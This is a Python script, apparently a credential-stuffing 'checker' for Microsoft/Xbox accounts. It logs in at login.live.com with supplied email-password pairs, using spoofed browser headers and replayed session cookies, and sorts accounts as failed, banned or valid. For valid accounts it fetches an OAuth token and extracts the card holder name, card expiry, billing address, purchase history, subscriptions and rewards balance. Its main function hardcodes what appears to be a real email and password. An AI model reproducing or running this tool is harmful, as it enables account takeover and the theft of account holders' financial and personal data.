import requests
import json
import urllib.parse
import random
from typing import Dict, Optional, List
from pathlib import Path
import warnings

warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class XboxChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0'
        })

    def check_account(self, email: str, password: str) -> Dict:
        try:
            login_url = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={email}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
            
            login_data = {
                'ps': '2',
                'psRNGCDefaultType': '',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': '',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': '-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$',
                'PPSX': 'PassportRN',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i13': '1',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '1',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password
            }

            login_headers = {
                'Host': 'login.live.com',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"12.0.0"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://login.live.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'X-Edge-Shopping-Flag': '1',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Length': '583',
                'Referer': f'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username={email}'
            }

            login_cookies = {
                'CAW': '%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E',
                'DIDC': 'ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1',
                'DIDCL': 'ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1',
                'MSPRequ': 'id=N&lt=1716398680&co=1',
                'uaid': 'a5b22c26bc704002ac309462e8d061bb',
                'MSPOK': '$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89',
                'OParams': '11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$',
                'MicrosoftApplicationsTelemetryDeviceId': '49a10983-52d4-43ed-9a94-14ac360a5683',
                'ai_session': 'K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878',
                'MSFPC': 'GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949'
            }

            timeout = 30
            response = self.session.post(
                login_url, 
                data=login_data, 
                headers=login_headers, 
                cookies=login_cookies,
                timeout=timeout, 
                verify=False, 
                allow_redirects=True
            )
            
            if any(x in response.text for x in ['Your account or password is incorrect.', 'That Microsoft account doesn\'t exist', 'Sign in to your Microsoft account']):
                return {'status': 'FAIL', 'message': 'Invalid credentials'}
            
            if ',AC:null,urlFedConvertRename' in response.text:
                return {'status': 'BAN', 'message': 'Account banned'}
            
            if 'timed out' in response.text:
                return {'status': 'FAIL', 'message': 'Request timed out'}

            cookies = '; '.join([f"{c.name}={c.value}" for c in self.session.cookies])
            if not any(x in cookies or 'oauth20_desktop.srf?' in response.url for x in ['ANON', 'WLSSC']):
                return {'status': 'FAIL', 'message': 'Login failed'}

            oauth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
            oauth_headers = {
                'Host': 'login.live.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Referer': 'https://account.microsoft.com/'
            }
            oauth_response = self.session.get(oauth_url, headers=oauth_headers, timeout=timeout, verify=False)
            
            token = None
            if 'access_token=' in oauth_response.url:
                token = urllib.parse.unquote(oauth_response.url.split('access_token=')[1].split('&')[0])

            if not token:
                return {'status': 'FAIL', 'message': 'Could not obtain access token'}

            payment_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': f'MSADELEGATE1.0="{token}"',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Host': 'paymentinstruments.mp.microsoft.com',
                'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2',
                'Origin': 'https://account.microsoft.com',
                'Referer': 'https://account.microsoft.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Sec-GPC': '1'
            }

            payment_response = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US', 
                                             headers=payment_headers, timeout=timeout, verify=False)
            payment_text = payment_response.text

            transactions_response = self.session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', 
                                                  headers=payment_headers, timeout=timeout, verify=False)
            transactions_text = transactions_response.text

            rewards_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Authorization': f'Bearer {token}',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://account.microsoft.com/',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json'
            }
            
            rewards_auth_url = 'https://rewards.microsoft.com/api/v1/authtoken'
            rewards_auth_response = self.session.get(rewards_auth_url, headers=rewards_headers, verify=False)
            
            try:
                rewards_auth_data = json.loads(rewards_auth_response.text)
                print(rewards_auth_data)
                if 'authToken' in rewards_auth_data:
                    rewards_token = rewards_auth_data['authToken']
                    rewards_headers['Authorization'] = f'Bearer {rewards_token}'
                    
                    rewards_response = self.session.get('https://rewards.microsoft.com/api/v1/user/me/dashboard', 
                                                      headers=rewards_headers, verify=False)
                    print(rewards_response.text)
                    rewards_data = json.loads(rewards_response.text)
                    if 'userStatus' in rewards_data and 'availablePoints' in rewards_data['userStatus']:
                        rewards_points = str(rewards_data['userStatus']['availablePoints'])
            except:
                try:
                    rewards_response = self.session.get('https://rewards.bing.com/api/getuserinfo?type=1', 
                                                      headers=rewards_headers, verify=False)
                    rewards_data = json.loads(rewards_response.text)
                    if 'balance' in rewards_data:
                        rewards_points = str(rewards_data['balance'])
                except:
                    rewards_points = None

            balance = payment_text.split('balance\":')[1].split(',\"')[0] if 'balance\":' in payment_text else None
            card_holder = payment_text.split('paymentMethodFamily\":\"credit_card\",\"display\":{\"name\":\"')[1].split('\"')[0] if 'paymentMethodFamily\":\"credit_card\",\"display\":{\"name\":\"' in payment_text else None
            has_cc = 'paymentMethodFamily\":\"credit_card\"' in payment_text
            cc_expiry = payment_text.split('\"expiration\":\"')[1].split('\"')[0] if '\"expiration\":\"' in payment_text else None
            account_holder = payment_text.split('accountHolderName\":\"')[1].split('\",\"')[0] if 'accountHolderName\":\"' in payment_text else None
            zipcode = payment_text.split('\"postal_code\":\"')[1].split('\",')[0] if '\"postal_code\":\"' in payment_text else None
            region = payment_text.split('\"region\":\"')[1].split('\",')[0] if '\"region\":\"' in payment_text else None
            address1 = payment_text.split('{\"address_line1\":\"')[1].split('\",')[0] if '{\"address_line1\":\"' in payment_text else None
            city = payment_text.split('\"city\":\"')[1].split('\",')[0] if '\"city\":\"' in payment_text else None
            country = transactions_text.split('country\":\"')[1].split('\"}')[0] if 'country\":\"' in transactions_text else None

            item1 = transactions_text.split('\"title\":\"')[1].split('\"')[0] if '\"title\":\"' in transactions_text else None
            description = transactions_text.split('\"description\":\"')[1].split('\",')[0] if '\"description\":\"' in transactions_text else None
            quantity = transactions_text.split('\"quantity\":')[1].split(',')[0].strip() if '\"quantity\":' in transactions_text else None
            amount = transactions_text.split('\"totalAmount\":')[1].split(',')[0].strip() if '\"totalAmount\":' in transactions_text else None
            ctpid = transactions_text.split('\"subscriptionId\":\"ctp:')[1].split('\"')[0] if '\"subscriptionId\":\"ctp:' in transactions_text else None
            auto_renew = "true" if ctpid and '{\"subscriptionId\":\"ctp:' + ctpid + '\",\"autoRenew\":true' in transactions_text else "false"
            start_date = transactions_text.split('\"startDate\":\"')[1].split('T')[0] if '\"startDate\":\"' in transactions_text else None
            next_renewal = transactions_text.split('\"nextRenewalDate\":\"')[1].split('T')[0] if '\"nextRenewalDate\":\"' in transactions_text else None

            result = {
                "status": "SUCCESS",
                "address": {
                    "address": address1 or '',
                    "city": city or '',
                    "state": region or '',
                    "postal_code": zipcode or ''
                },
                "payment": {
                    "country": country or '',
                    "card_holder": account_holder or '',
                    "card_type": card_holder or '',
                    "balance": balance or '0.0',
                    "has_cc": has_cc,
                    "expiry": cc_expiry or ''
                },
                "subscriptions": [{
                    "item": item1 or '',
                    "auto_renew": auto_renew == "true",
                    "start_date": start_date or '',
                    "next_billing": next_renewal or ''
                }],
                "products": [{
                    "name": description or '',
                    "quantity": quantity or '0',
                    "price": amount or '0.0'
                }],
                "rewards_points": rewards_points or '0'
            }

            return result

        except requests.exceptions.Timeout:
            return {'status': 'ERROR', 'message': 'Request timed out'}
        except requests.exceptions.SSLError:
            return {'status': 'ERROR', 'message': 'SSL verification failed'}
        except Exception as e:
            return {'status': 'ERROR', 'message': str(e)}

def main():
    checker = XboxChecker()

    email = "a_dmi_n@hotmail.com"
    password = "faycal1981aaaAAA@"
    result = checker.check_account(email, password)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main() 